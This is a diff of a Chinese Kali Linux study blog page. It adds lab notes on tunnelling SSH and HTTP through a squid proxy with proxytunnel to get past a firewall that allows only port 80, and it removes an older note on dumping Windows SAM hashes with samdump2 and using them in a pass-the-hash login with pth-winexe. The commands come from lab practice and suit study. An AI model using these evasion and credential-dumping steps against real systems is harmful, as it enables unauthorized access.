@@ -240,6 +240,351 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/" itemprop="url">Kali Linux笔记(七十四)：HTTP(S)隧道--proxyptunnel</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T19:55:27+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-proxytunnel"><a href="#1-proxytunnel" class="headerlink" title="1. proxytunnel"></a>1. proxytunnel</h4><ul>
+<li>通过标准的HTTP/HTTPS代理创建隧道的工具</li>
+<li>通过HTTP CONNECT方法封装信息</li>
+<li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li>
+<li>无法创建DNS隧道和ICMP隧道</li>
+<li>侦听端口开在本地上，可以指定需要访问的资源，服务器</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0ff5dBvxxh2QYfBIyqN1n69zrQQQ3WfbJ6EIsassfHuRcwUyV5HU-y3TmKy2RtwpRwU7rnsCWcyzEEGRT9qJyRqcLQ_VyOBQwkWmo2LqRkqnFu-UQngypdc5vCI&file_name=/proxytunnel.PNG" alt="HTTP/HTTPS代理隧道"></p>
+<h4 id="2-实验-1–准备"><a href="#2-实验-1–准备" class="headerlink" title="2. 实验-1–准备"></a>2. 实验-1–准备</h4><ul>
+<li>将外网资源映射为内网指定端口</li>
+<li>Mono防火墙<ul>
+<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
+</ul>
+</li>
+<li>bodhi（代理服务器）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=20ea47jfCKJ8tyRlcsMN_-I8Tjv6aAOYiun_Sm85oK1qqReUoamxOqxABJw1MoSipmiWZKutsr0kdVmPC9kpBLJ_oN_yruhSsaHVYkxP7uj-LehXu1c2FhO98T3L_9BwxTWn2Bvo&file_name=/proxytunnel-%E5%AE%9E%E9%AA%8C%E4%B8%80.PNG" alt="proxytunnel实验-1"></p>
+<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
+<li>bodhi（代理服务器）<ul>
+<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
+<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
+<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
+<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
+<li>/^http_port → 内网IP:3128</li>
+<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
+<li>/^acl → 查看安全策略</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
+<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
+</ul>
+</li>
+<li>bodhi（代理服务器）<ul>
+<li>关闭mono防火墙默认规则</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>在无代理的情况下访问外网资源尝试</li>
+<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>开启Web服务</li>
+<li>启动Wireshark抓包</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>访问Kali的Web服务进行尝试</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看抓包的数据分析（TCP Stream → Via/X-Fowarded-For会泄露真实IP以及代理IP）</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>关闭代理端口</li>
+<li><strong><code>🔺命令：proxytunnle -a（监听端口）80 -p 代理服务器IP:3128 -d Kali的IP:80</code></strong></li>
+<li>浏览器访问http:127.0.0.1:80进行尝试</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验-2–准备"><a href="#4-实验-2–准备" class="headerlink" title="4. 实验-2–准备"></a>4. 实验-2–准备</h4><ul>
+<li>外网资源非防火墙允许端口</li>
+<li>修改目标资源侦听端口可能无法躲避防火墙深层检测（协议检测可发现非80HTTP流量）</li>
+<li>外网安装squid3代理服务器并侦听80端口</li>
+<li>Mono防火墙<ul>
+<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
+</ul>
+</li>
+<li>bodhi（代理服务器）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>Kali（代理服务器+目标资源）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=a7cez7_WJG3fQHBcB9CBgiLtXv1ZFPxvrWzfdzq5EwRfHARUwA8k6kcEpl2kk3pPqqKUdyXMI849QvHyqkeLYFKHYSOCC_Sei0VbXQ3RT6wf-HD3qCZyw0JG7A0wn_AKs3z18jR1&file_name=/proxytunnel-%E5%AE%9E%E9%AA%8C%E4%BA%8C.PNG" alt="proxytunnel实验-2"></p>
+<h4 id="5-实验-2"><a href="#5-实验-2" class="headerlink" title="5. 实验-2"></a>5. 实验-2</h4><ul>
+<li>bodhi（代理服务器）<ul>
+<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
+<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
+<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
+<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
+<li>/^http_port → 内网IP:3128</li>
+<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
+<li>/^acl → 查看安全策略</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
+<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
+</ul>
+</li>
+<li>bodhi（代理服务器）<ul>
+<li>关闭mono防火墙默认规则</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li>在无代理的情况下访问外网资源尝试</li>
+<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
+</ul>
+</li>
+<li>Kali（代理服务器+目标资源）<ul>
+<li>关闭apache服务</li>
+<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
+<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong><ul>
+<li>/^http_port → 本机IP:80</li>
+<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
+<li>/^acl → 查看安全策略</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：service squid3 start</code></strong>（netstat -pantu查看）</li>
+<li>开启SSH服务（修改SSH配置文件，netstat -pantu查看）</li>
+<li>开启Wireshark抓包（主要抓取888）</li>
+</ul>
+</li>
+<li>PC（bodhi克隆）<ul>
+<li><strong><code>🔺命令：proxytunnle -a 2222 -p 代理服务器IP:3128 -r Kali的IP:80 -d Kali的IP:22</code></strong></li>
+<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong>进行连接尝试（密钥交换、输入密码 → ifconfig）</li>
+<li><strong><code>🔺命令：proxytunnle -a 888 -p 代理服务器IP:3128 -r Kali的IP:80 -d 192.168.0.1:80</code></strong></li>
+<li>浏览器访问127.0.0.1:888</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>▲ Wireshark抓包可看出，TCP Stream（tcp.stream eq 0）→ 方法为CONNECT</li>
+</ul>
+</li>
+<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH和HTTP都无法访问，数据包显示为Method Not Allowed方法不允许</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0ba7GtLCdyzl3R0mqV9BcOddF59mehQa8RzVoYKWxBCmpCKyjBQUt_cOkWgv_CpWobHSDu54ECuyc8ef2XgmpiPiz6DxGJGHR6FvzlFItRCtpzt4OoIeng&file_name=/CONNECT.PNG" alt="CONNECT数据包"></p>
+<h4 id="6-实验-3"><a href="#6-实验-3" class="headerlink" title="6. 实验-3"></a>6. 实验-3</h4><ul>
+<li>ssh客户端配置自动创建代理链隧道</li>
+<li>PC（bodhi克隆）<ul>
+<li><strong><code>🔺命令：sudo vi ~/.ssh/config</code></strong><ul>
+<li>Host Kali的IP </li>
+<li>Hostname Kali的IP</li>
+<li>ProtocolKeepAlives 30 </li>
+<li>ProxyCommand /usr/bin/proxytunnel \</li>
+<li>-p 代理服务器IP:3128 \</li>
+<li>-r Kali的IP:80 -d %h:%p</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：ssh root@Kali的IP -p 22</code></strong></li>
+</ul>
+</li>
+<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH无法访问，数据包显示为Method Not Allowed方法不允许</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=685fRLnG0FC7rVWbF8ZNWjg7qtn7l23wAEeh8hJtXZQ_wcGq435AlB8aSOT3DK07ZdakoQAHH4d-ywEAEYnpXr3RQzu2WkOZ2E0ysaLxSrfzw4W_CeUwuQNatdiZzxuN5w&file_name=/Method%20Not%20Allow.PNG" alt="Method Not Allow"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2952,202 +3297,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/" itemprop="url">Kali Linux笔记(六十四)：密码嗅探--传递Hash值</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
-                2020-01-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  161 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Pass-the-Hash（PTH）"><a href="#1-Pass-the-Hash（PTH）" class="headerlink" title="1. Pass the Hash（PTH）"></a>1. Pass the Hash（PTH）</h4><ul>
-<li>密码破解耗费时间资源巨大 </li>
-<li>使用密文提交给服务器直接完成身份认证 </li>
-<li>NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）</li>
-<li>企业中使用ghost等工具克隆安装系统</li>
-<li>操作<ul>
-<li>Win7插入一个Kali光盘，用光盘启动</li>
-<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong></li>
-<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong></li>
-<li><strong><code>🔺命令：samdump2 SYSTEM SAM</code></strong></li>
-<li>使用nc传递HASH值</li>
-<li>Win7光盘释放重启，关闭Win7防火墙</li>
-<li><strong><code>🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd</code></strong></li>
-</ul>
-</li>
-<li>▲ 只适用于Window系统</li>
-<li>▲ 2020.1.27 CreateService failed. NT_STATUS_ACCESS_DENIED</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/4/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/6/">Next</a>
   </nav>
 
 
@@ -3197,7 +3351,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">120</span>
+                  <span class="site-state-item-count">121</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3304,7 +3458,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">105.2k</span>
+    <span title="Site words total count">107.4k</span>
   
 </div>
 
